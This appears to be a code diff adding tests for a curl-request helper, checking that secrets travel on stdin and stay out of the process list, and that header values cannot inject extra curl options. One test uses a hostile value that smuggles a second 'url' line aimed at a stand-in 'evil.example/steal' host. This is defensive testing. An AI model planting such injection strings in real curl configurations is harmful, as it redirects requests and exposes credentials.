@@ -1,6 +1,9 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { createServer } from 'node:http';
+import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
 import type { AddressInfo } from 'node:net';
 import {
   assertBoardHttpOk,
@@ -108,6 +111,85 @@ test('createCurlRequestFn: real request against a local server (method, headers,
   } finally {
     await new Promise<void>((resolve) => server.close(() => resolve()));
   }
+});
+
+test('createCurlRequestFn: credentials never reach the process list — argv stays clean, the config rides on stdin', async () => {
+  // `ps` shows argv, so a token passed as `-H "Authorization: Bearer …"` is a
+  // local leak. This stub records BOTH what it was called with and what it read
+  // on stdin, which is the only way to prove the secret is not in argv.
+  const dir = mkdtempSync(join(tmpdir(), 'takumi-curl-stub-'));
+  const argvFile = join(dir, 'argv.txt');
+  const stdinFile = join(dir, 'stdin.txt');
+  const stub = join(dir, 'curl-stub.mjs');
+  writeFileSync(
+    stub,
+    [
+      '#!/usr/bin/env node',
+      "import { writeFileSync } from 'node:fs';",
+      "let input = '';",
+      "process.stdin.on('data', (chunk) => (input += chunk));",
+      "process.stdin.on('end', () => {",
+      `  writeFileSync(${JSON.stringify(argvFile)}, process.argv.slice(2).join(' '));`,
+      `  writeFileSync(${JSON.stringify(stdinFile)}, input);`,
+      "  process.stdout.write('{\"ok\":true}\\n200');",
+      '});',
+      '',
+    ].join('\n'),
+  );
+  chmodSync(stub, 0o755);
+
+  const request = createCurlRequestFn({ curlBinary: stub, headers: () => ({ 'X-Secret-Token': 'super-secret-value' }) });
+  const res = await request({ method: 'POST', url: 'https://board.example/items', body: { title: 'x' } });
+  assert.equal(res.status, 200);
+  assert.deepEqual(JSON.parse(res.body), { ok: true });
+
+  const argv = readFileSync(argvFile, 'utf8');
+  assert.ok(!argv.includes('super-secret-value'), `the token must never be an argument: ${argv}`);
+  assert.ok(!argv.includes('board.example'), 'even the URL travels on stdin');
+  assert.match(argv, /-K -/, 'curl reads its config from stdin');
+
+  const config = readFileSync(stdinFile, 'utf8');
+  assert.match(config, /^request = "POST"$/m);
+  assert.match(config, /^max-time = "30"$/m);
+  assert.match(config, /^header = "X-Secret-Token: super-secret-value"$/m);
+  assert.match(config, /^header = "Content-Type: application\/json"$/m);
+  // The JSON body's quotes are escaped inside the quoted value, so it cannot be
+  // mistaken for the end of the string (asserted literally, not as a regex).
+  assert.ok(
+    config.includes('data-binary = "{\\"title\\":\\"x\\"}"'),
+    `the JSON body must stay a single escaped value: ${config}`,
+  );
+  assert.match(config, /^url = "https:\/\/board\.example\/items"$/m);
+});
+
+test('createCurlRequestFn: a value that tries to inject another option stays inside its quotes', async () => {
+  const dir = mkdtempSync(join(tmpdir(), 'takumi-curl-inject-'));
+  const stdinFile = join(dir, 'stdin.txt');
+  const stub = join(dir, 'curl-stub.mjs');
+  writeFileSync(
+    stub,
+    [
+      '#!/usr/bin/env node',
+      "import { writeFileSync } from 'node:fs';",
+      "let input = '';",
+      "process.stdin.on('data', (chunk) => (input += chunk));",
+      "process.stdin.on('end', () => {",
+      `  writeFileSync(${JSON.stringify(stdinFile)}, input);`,
+      "  process.stdout.write('ok\\n200');",
+      '});',
+      '',
+    ].join('\n'),
+  );
+  chmodSync(stub, 0o755);
+
+  const hostile = 'x"\nurl = "https://evil.example/steal';
+  const request = createCurlRequestFn({ curlBinary: stub, headers: () => ({ 'X-Test': hostile }) });
+  await request({ method: 'GET', url: 'https://board.example/items' });
+  const config = readFileSync(stdinFile, 'utf8');
+  // One header line only, and the embedded quote/newline are escaped inside it.
+  assert.equal(config.split('\n').filter((l) => l.startsWith('header = ')).length, 1);
+  assert.match(config, /^header = "X-Test: x\\"\\nurl = \\"https:\/\/evil\.example\/steal"$/m);
+  assert.ok(!/^url = "https:\/\/evil/m.test(config), 'the injected url must not become a real option');
 });
 
 test('createCurlRequestFn: an unreachable endpoint is a transport error, never a hang', async () => {
